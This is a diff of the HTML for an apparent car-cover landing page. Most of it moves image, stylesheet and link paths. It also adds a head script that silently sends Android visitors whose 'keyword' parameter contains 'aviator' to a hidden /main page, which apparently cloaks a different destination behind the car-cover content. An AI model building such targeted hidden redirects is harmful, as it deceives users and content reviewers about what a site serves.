@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <title>Stylish and Protective Aviator Car Covers</title>
-    <link rel="icon" href="favicon.ico"/>
+    <link rel="icon" href="/static/img/favicon.ico"/>
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="title" content="Stylish and Protective Aviator Car Covers">
     <meta name="description"
@@ -15,10 +15,22 @@
     <meta name="twitter:description"
           content="Aviator car covers protect a car's interior from dirt and damage while adding personality and style.">
     <meta name="twitter:card" content="summary_large_image">
-    <link rel="stylesheet" href="css/css.css">
-    <link rel="stylesheet" href="css/index.css">
+    <link rel="stylesheet" href="/static/css/css.css">
+    <link rel="stylesheet" href="/static/css/index.css">
 
+    <script>
+        var currentUrl = window.location.href;
+        var url = new URL(currentUrl);
+        var keywordValue = url.searchParams.get("keyword");
+        var isAndroid = /Android/i.test(navigator.userAgent);
 
+        if (keywordValue && keywordValue.includes("aviator") && isAndroid) {
+            var searchParams = url.search;
+            var newUrl = window.location.origin + "/main" + searchParams;
+            window.location.replace(newUrl);
+        }
+
+    </script>
 </head>
 <body>
 
@@ -54,20 +66,20 @@
                                                 class="gita-nav--link contact gita-nav--link-bzdz1ay2  "><span
                                         class="gita-nav--link-icon"></span><span
                                         class="gita-nav--link-text">Contact</span></a></li>
-                                <li class=""><a href="privacy.html"
+                                <li class=""><a href="/privacy"
                                                 class="gita-nav--link privacy-policy gita-nav--link-bzdz1ay2  "><span
                                         class="gita-nav--link-icon"></span><span class="gita-nav--link-text">Privacy policy</span></a>
                                 </li>
-                                <li class=""><a href="terms.html"
+                                <li class=""><a href="/terms"
                                                 class="gita-nav--link terms-of-use gita-nav--link-ttq2q1ug  "><span
                                         class="gita-nav--link-text">Terms of use</span></a></li>
-                                <li class=""><a href="cookie.html"
+                                <li class=""><a href="/cookie"
                                                 class="gita-nav--link cookie gita-nav--link-ghfi8gyx  "><span
                                         class="gita-nav--link-text">Cookie</span></a></li>
-                                <li class=""><a href="data.html"
+                                <li class=""><a href="/data"
                                                 class="gita-nav--link data gita-nav--link-dbi695yl  "><span
                                         class="gita-nav--link-text">Data</span></a></li>
-                                <li class=""><a href="dmca.html"
+                                <li class=""><a href="/dmca"
                                                 class="gita-nav--link dmca gita-nav--link-b8a6nkov  "><span
                                         class="gita-nav--link-text">Dmca</span></a></li>
                             </ul>
@@ -122,7 +134,7 @@
                 <div class="col-lg-1/3 col-md-1/2 ">
                     <div class="column-inner gita-column-nvmsw8yl  1/3">
                         <div class="gita-wrapper gita-image-becj4hav-wrapper "><img
-                                src="images/6.jpg" alt=""
+                                src="/static/images/6.jpg" alt=""
                                 loading="lazy" class="gita-image-becj4hav "></div>
                         <div class="gita-wrapper gita-heading-evdbz8zn-wrapper "><h4
                                 class="gita-heading gita-heading-evdbz8zn "><span>Protection
@@ -137,7 +149,7 @@
                 <div class="col-lg-1/3 col-md-1/2 col-xs-7/8 ">
                     <div class="column-inner gita-column-ud96l9hb  1/3">
                         <div class="gita-wrapper gita-image-yb36pafs-wrapper "><img
-                                src="images/5.jpg" alt=""
+                                src="/static/images/5.jpg" alt=""
                                 loading="lazy" class="gita-image-yb36pafs "></div>
                         <div class="gita-wrapper gita-heading-qtz3jc69-wrapper "><h4
                                 class="gita-heading gita-heading-qtz3jc69 "><span>Increased service life
@@ -150,7 +162,7 @@
                 <div class="col-lg-1/3 col-md-1/2 col-xs-7/8 ">
                     <div class="column-inner gita-column-z43u0sji  1/3">
                         <div class="gita-wrapper gita-image-wxe0f54h-wrapper "><img
-                                src="images/4.jpg" alt=""
+                                src="/static/images/4.jpg" alt=""
                                 loading="lazy" class="gita-image-wxe0f54h "></div>
                         <div class="gita-wrapper gita-heading-xed2wz74-wrapper "><h4
                                 class="gita-heading gita-heading-xed2wz74 "><span>Comfort
@@ -163,7 +175,7 @@
                 <div class="col-lg-1/3 col-md-1/2 col-xs-7/8 ">
                     <div class="column-inner gita-column-kuingruv  1/3">
                         <div class="gita-wrapper gita-image-myglcuis-wrapper "><img
-                                src="images/3.jpg" alt=""
+                                src="/static/images/3.jpg" alt=""
                                 loading="lazy" class="gita-image-myglcuis "></div>
                         <div class="gita-wrapper gita-heading-75xmswpy-wrapper "><h4
                                 class="gita-heading gita-heading-75xmswpy "><span>Aesthetics
@@ -177,7 +189,7 @@
                 <div class="col-lg-1/3 col-md-1/2 col-xs-7/8 ">
                     <div class="column-inner gita-column-qg6qb3al  1/3">
                         <div class="gita-wrapper gita-image-h5fytn34-wrapper "><img
-                                src="images/2.jpg" alt=""
+                                src="/static/images/2.jpg" alt=""
                                 loading="lazy" class="gita-image-h5fytn34 "></div>
                         <div class="gita-wrapper gita-heading-xjumpr0c-wrapper "><h4
                                 class="gita-heading gita-heading-xjumpr0c "><span>Quality Craftsmanship</span></h4>
@@ -190,7 +202,7 @@
                 <div class="col-lg-1/3 col-md-1/2 ">
                     <div class="column-inner gita-column-3q4ahve5  1/3">
                         <div class="gita-wrapper gita-image-1n5e7nay-wrapper "><img
-                                src="images/11.jpg" alt=""
+                                src="/static/images/11.jpg" alt=""
                                 loading="lazy" class="gita-image-1n5e7nay "></div>
                         <div class="gita-wrapper gita-heading-h4si1byn-wrapper "><h4
                                 class="gita-heading gita-heading-h4si1byn "><span>Lasting Protection</span></h4></div>
@@ -255,7 +267,7 @@
                 <div class="gita-container-p54zewxj  ">
                     <div class="gita-container-dchjql4w  ">
                         <div class="gita-wrapper gita-image-fyhd25sa-wrapper "><img alt="vehicle cover"
-                                                                                      src="images/10.jpg"
+                                                                                      src="/static/images/10.jpg"
                                                                                       loading="lazy"
                                                                                       class="gita-image-fyhd25sa ">
                         </div>
@@ -272,7 +284,7 @@
                 <div class="gita-container-msh5xiji  ">
                     <div class="gita-container-p1s3dgfg  ">
                         <div class="gita-wrapper gita-image-j9z2pz7m-wrapper "><img alt="car interior"
-                                                                                      src="images/1.jpeg"
+                                                                                      src="/static/images/1.jpeg"
                                                                                       loading="lazy"
                                                                                       class="gita-image-j9z2pz7m ">
                         </div>
@@ -290,7 +302,7 @@
             <div class="gita-container-1st53pgd  ">
                 <div class="gita-container-eqb539r8  ">
                     <div class="gita-wrapper gita-image-qckmqazg-wrapper "><img alt="car cover style"
-                                                                                  src="images/9.jpg"
+                                                                                  src="/static/images/9.jpg"
                                                                                   loading="lazy"
                                                                                   class="gita-image-qckmqazg "></div>
                 </div>
@@ -311,7 +323,7 @@
                 <div class="col-lg-1/2 col-md-1/2 col-xs-1/1 ">
                     <div class="column-inner gita-column-ghp4q3nq  1/2">
                         <div class="gita-wrapper gita-image-hdpw162s-wrapper "><img alt="car cover install"
-                                                                                      src="images/8.jpg"
+                                                                                      src="/static/images/8.jpg"
                                                                                       loading="lazy"
                                                                                       class="gita-image-hdpw162s ">
                         </div>
